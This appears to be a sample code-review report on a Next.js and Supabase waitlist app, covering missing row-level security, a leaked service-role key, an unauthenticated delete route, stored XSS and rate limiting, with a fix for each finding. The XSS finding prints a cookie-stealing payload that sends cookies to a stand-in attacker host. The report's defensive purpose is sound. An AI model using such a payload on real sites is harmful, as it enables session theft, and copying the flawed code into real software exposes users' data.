# Codebase Review — the-app (Anonymized)

## Executive summary

the-app is a SaaS waitlist manager built by a non-engineer founder using an AI coding tool. It lets users create a public signup page, collect emails, and view a dashboard of their waitlist and referral stats. It is built on Next.js (App Router) with TypeScript and Supabase (Postgres + Auth). The codebase is cleanly structured and mostly idiomatic, but it has two critical issues that allow any anonymous visitor to read or delete another user's data, plus several high-severity gaps around XSS, rate limiting, and broken authorization. The top risks are: database rows readable/deletable by anyone (RLS not enabled and a service-role key bundled into the browser), and a stored-XSS vector on the dashboard. These can be fixed without a rewrite; the highest-priority items are under a day of work combined.

## Findings table

| Severity | File:Line | Issue | Impact | Fix effort |
|----------|-----------|-------|--------|------------|
| Critical | `supabase/migrations/20240601_initial_schema.sql:12-18` | Row Level Security never enabled; no policies on `waitlists` or `signups` | Any anonymous client can read or write every user's data | ~2h |
| Critical | `lib/supabase.ts:3-6` | Service-role key exposed via `NEXT_PUBLIC_` prefix in client bundle | Bypasses RLS entirely; full database access in the browser | ~1h |
| High | `app/api/waitlists/[id]/route.ts:10-20` | DELETE handler has no session check | Any caller can delete any waitlist by ID | ~1h |
| High | `app/dashboard/[slug]/page.tsx:41-44` | `dangerouslySetInnerHTML` renders user-controlled text | Stored XSS on the owner's dashboard | ~1h |
| High | `app/api/join/route.ts:8-14` | Public signup endpoint has no rate limiting | Email-bombing, list poisoning, abuse | ~2h |
| Medium | `app/dashboard/page.tsx:20-30` | N+1 queries; missing index on `signups.waitlist_id` | Slow dashboard load as signups grow | ~2h |
| Medium | `lib/supabase-server.ts:8-14` | Supabase client re-created per request, no cookie context | Overhead; `getUser()` returns null so auth checks silently skipped | ~1h |
| Low | `app/api/join/route.ts:9-12` | No input validation on email before insert | Malformed/oversized data; junk rows | ~1h |

## Detailed findings

### 1. Critical — Row Level Security is never enabled

**File:** `supabase/migrations/20240601_initial_schema.sql:12-18`

```sql
12  create table public.waitlists (
13    id uuid primary key default gen_random_uuid(),
14    owner_id uuid references auth.users not null,
15    name text not null,
16    slug text unique not null,
17    created_at timestamptz default now()
18  );
```

**Why it's a problem:** Supabase does not enable Row Level Security by default. The migration creates both the `waitlists` and `signups` tables without an `alter table ... enable row level security` statement, so every row is readable and writable by the `anon` role. A visitor who knows the project URL and the anon key (which is in every page's JS bundle by design) can list every waitlist on the platform, export every email, and overwrite or delete rows — no login required. The `owner_id` column suggests per-user isolation was intended, but no policy enforces it.

**Fix:** Enable RLS on both tables and add owner-scoped policies in a new migration.

```sql
alter table public.waitlists enable row level security;
alter table public.signups enable row level security;

create policy "owners select own waitlists"
  on public.waitlists for select
  using (auth.uid() = owner_id);

create policy "owners insert own waitlists"
  on public.waitlists for insert
  with check (auth.uid() = owner_id);

create policy "owners delete own waitlists"
  on public.waitlists for delete
  using (auth.uid() = owner_id);

-- signups: allow public insert (the join form), read only by the owner
create policy "anyone can insert signup"
  on public.signups for insert
  with check (true);

create policy "owners select their signups"
  on public.signups for select
  using (
    exists (
      select 1 from public.waitlists w
      where w.id = signups.waitlist_id
        and w.owner_id = auth.uid()
    )
  );
```

---

### 2. Critical — Service-role key exposed in the client bundle

**File:** `lib/supabase.ts:3-6`

```ts
1  import { createClient } from '@supabase/supabase-js';
2
3  export const supabase = createClient(
4    process.env.NEXT_PUBLIC_SUPABASE_URL!,
5    process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY!
6  );
```

**Why it's a problem:** The service-role key bypasses Row Level Security entirely — it is the "trusted server" credential. Two mistakes compound here: it is loaded into a module imported by client components, and it is prefixed with `NEXT_PUBLIC_`, which Next.js inlines directly into the browser bundle. Anyone who opens DevTools can read the service-role key and issue arbitrary SQL through the Supabase REST API, making every other protection in the app moot.

**Fix:** Use the `anon` key for any client-side client, and only use the service-role key server-side (and only when strictly necessary, e.g. admin jobs).

```ts
// client and shared code
export const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);
```

Then rotate the leaked service-role key in the Supabase dashboard, and never reference `SUPABASE_SERVICE_ROLE_KEY` outside a server-only context (`server-only` module or a route handler with the `nodejs` runtime).

---

### 3. High — Route handler deletes without checking the session

**File:** `app/api/waitlists/[id]/route.ts:10-20`

```ts
10  export async function DELETE(
11    _req: Request,
12    { params }: { params: { id: string } }
13  ) {
14    const supabase = createClient(url, anonKey);
15    const { error } = await supabase
16      .from('waitlists')
17      .delete()
18      .eq('id', params.id);
19    return NextResponse.json({ ok: !error });
20  }
```

**Why it's a problem:** The handler deletes by ID without confirming who is calling. Once the client is given a `waitlist_id`, a single `curl -X DELETE /api/waitlists/<id>` removes the row. This would be bad even with RLS on, because the request uses a server-side client that does not carry the user's identity; but combined with finding 1, the endpoint is wide open.

**Fix:** Load the session server-side and scope the delete to the authenticated owner.

```ts
import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';

export async function DELETE(
  _req: Request,
  { params }: { params: { id: string } }
) {
  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    { cookies: () => cookies() }
  );

  const { data: { user } } = await supabase.auth.getUser();
  if (!user) {
    return NextResponse.json({ error: 'unauthorized' }, { status: 401 });
  }

  const { error } = await supabase
    .from('waitlists')
    .delete()
    .eq('id', params.id)
    .eq('owner_id', user.id);

  return NextResponse.json({ ok: !error });
}
```

---

### 4. High — `dangerouslySetInnerHTML` renders user-controlled text

**File:** `app/dashboard/[slug]/page.tsx:41-44`

```tsx
41  <div
42    className="prose"
43    dangerouslySetInnerHTML={{ __html: signup.meta?.referrer }}
44  />
```

**Why it's a problem:** `referrer` is free-form text captured from the signup form (for example, "how did you hear about us?"). Anyone can submit a value like `<img src=x onerror=fetch('https://evil.example.com?c='+document.cookie)>`, which is then injected as raw HTML into the dashboard the owner views. This is a classic stored-XSS: the attacker's script runs in the owner's authenticated session and can exfiltrate their session token or mutate their data.

**Fix:** Render the value as text, not HTML.

```tsx
<div className="prose">
  {signup.meta?.referrer}
</div>
```

If rich text is genuinely required, sanitize it first (e.g. `sanitize-html` or `isomorphic-dompurify`) with an allow-list of tags — but for a single-line free-text field, plain text rendering is the correct choice.

---

### 5. High — Public signup endpoint has no rate limiting

**File:** `app/api/join/route.ts:8-14`

```ts
8   export async function POST(req: Request) {
9     const { email, slug } = await req.json();
10    const { error } = await supabase
11      .from('signups')
12      .insert({ email, waitlist_id: slug });
13    return NextResponse.json({ ok: !error });
14  }
```

**Why it's a problem:** This endpoint is anonymous and does no throttling. It can be hammered to fill the `signups` table with junk, to email-bomb a target address via the app's own confirmation email, or to brute-force which slugs exist (a validation oracle). There is no per-IP or per-email limit anywhere in the request path.

**Fix:** Add a rate limiter keyed by IP (and optionally by email). Using Upstash Redis with the App Router:

```ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 m'),
});

export async function POST(req: Request) {
  const ip = req.headers.get('x-forwarded-for') ?? 'unknown';
  const { success } = await ratelimit.limit(`join:${ip}`);
  if (!success) {
    return NextResponse.json({ error: 'too many requests' }, { status: 429 });
  }
  // ... rest of handler
}
```

---

### 6. Medium — N+1 queries and missing index

**File:** `app/dashboard/page.tsx:20-30`

```ts
20  const { data: waitlists } = await supabase
21    .from('waitlists')
22    .select('*');
23
24  for (const w of waitlists) {
25    const { count } = await supabase
26      .from('signups')
27      .select('id', { count: 'exact', head: true })
28      .eq('waitlist_id', w.id);
29    w.signupCount = count;
30  }
```

**Why it's a problem:** This issues one query for the list plus one query per waitlist to count its signups. With 50 waitlists the dashboard makes 51 round trips to Postgres, and the count on `signups.waitlist_id` has no index, so each count does a full scan of the table as signups grow. Response time degrades roughly linearly with the number of waitlists.

**Fix:** Fetch the counts in a single grouped query (or a Postgres function), and add the index.

```sql
create index signups_waitlist_id_idx on public.signups (waitlist_id);
```

```ts
const { data } = await supabase
  .from('waitlists')
  .select('*, signups(count)');
// each waitlist now carries a signups: [{ count }] aggregate
```

---

### 7. Medium — Supabase client re-created per request without cookie context

**File:** `lib/supabase-server.ts:8-14`

```ts
8   import { createClient } from '@supabase/supabase-js';
9
10  export function getSupabase() {
11    return createClient(
12      process.env.NEXT_PUBLIC_SUPABASE_URL!,
13      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
14    );
15  }
```

**Why it's a problem:** Every route handler and server action calls `getSupabase()`, creating a fresh client on each request. Beyond the avoidable overhead, these clients never receive the request cookies, so `auth.getUser()` silently returns `null` even for a logged-in user. That is the direct reason the DELETE handler in finding 3 shipped without a working auth check: the author tried `getUser()`, saw `null` during development, and removed the check rather than threading cookies through.

**Fix:** Use `@supabase/ssr` with a cookie-aware client for server code, and create it once per request.

```ts
import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';

export function getSupabase() {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    { cookies: () => cookies() }
  );
}
```

---

### 8. Low — No validation on the signup email

**File:** `app/api/join/route.ts:9-12`

```ts
9   const { email, slug } = await req.json();
10  const { error } = await supabase
11    .from('signups')
12    .insert({ email, waitlist_id: slug });
```

**Why it's a problem:** The email is inserted raw. There is no format check, no `trim()`/`toLowerCase()`, and no length cap, so the table accumulates junk rows (`"not an email"`, strings with whitespace, multi-megabyte payloads), and duplicate emails produce duplicate rows with no unique constraint to dedupe them. It's a data-quality problem today and a source of confusion in the dashboard and email sending later.

**Fix:** Validate with a schema before insert and normalize the value.

```ts
import { z } from 'zod';

const schema = z.object({
  email: z.string().trim().toLowerCase().email().max(254),
  slug: z.string().min(1).max(100),
});

const parsed = schema.safeParse(await req.json());
if (!parsed.success) {
  return NextResponse.json({ error: 'invalid input' }, { status: 400 });
}

await supabase.from('signups').insert({
  email: parsed.data.email,
  waitlist_id: parsed.data.slug,
});
```

Optionally add `create unique index signups_email_waitlist_idx on public.signups (waitlist_id, lower(email));` to prevent duplicate signups on the same list.

---

## Fix roadmap

**Do first (≈4h total)**
1. Enable RLS and add owner-scoped policies (finding 1) — ~2h.
2. Remove the service-role key from the client and rotate it (finding 2) — ~1h.
3. Add the session check to the DELETE handler (finding 3) — ~1h.

These three close the "anyone can read/delete everyone's data" hole and should be treated as a blocker.

**Do next (≈3h total)**
4. Replace `dangerouslySetInnerHTML` with text rendering (finding 4) — ~1h.
5. Add rate limiting to the join endpoint (finding 5) — ~2h.

**Do later (≈3h total)**
6. Collapse the N+1 counts into a single query and add the `signups(waitlist_id)` index (finding 6) — ~2h.
7. Switch server code to the cookie-aware `createServerClient` (finding 7) — ~1h.
8. Add schema validation and a unique index on signups (finding 8) — ~1h.

---

## What's already good

- **Clear structure.** The App Router layout, route handlers, and server/client boundaries are sensibly organized; there is no giant god-component or tangled import graph.
- **Consistent typing.** The codebase uses TypeScript throughout, and the Supabase table shapes are modeled in types rather than passed around as `any`.
- **Sane schema.** The migrations use `uuid` primary keys, `timestamptz`, and foreign keys — the data model itself is reasonable and easy to extend.
- **Graceful error handling.** Route handlers return JSON with status codes instead of throwing uncaught exceptions, and the client shows loading/empty states.
- **No obvious secret-in-repo beyond the one flagged.** Aside from the service-role key misuse, there are no hardcoded API keys or credentials checked into the repo.

---

Sample report for portfolio — all findings are from a demo project.
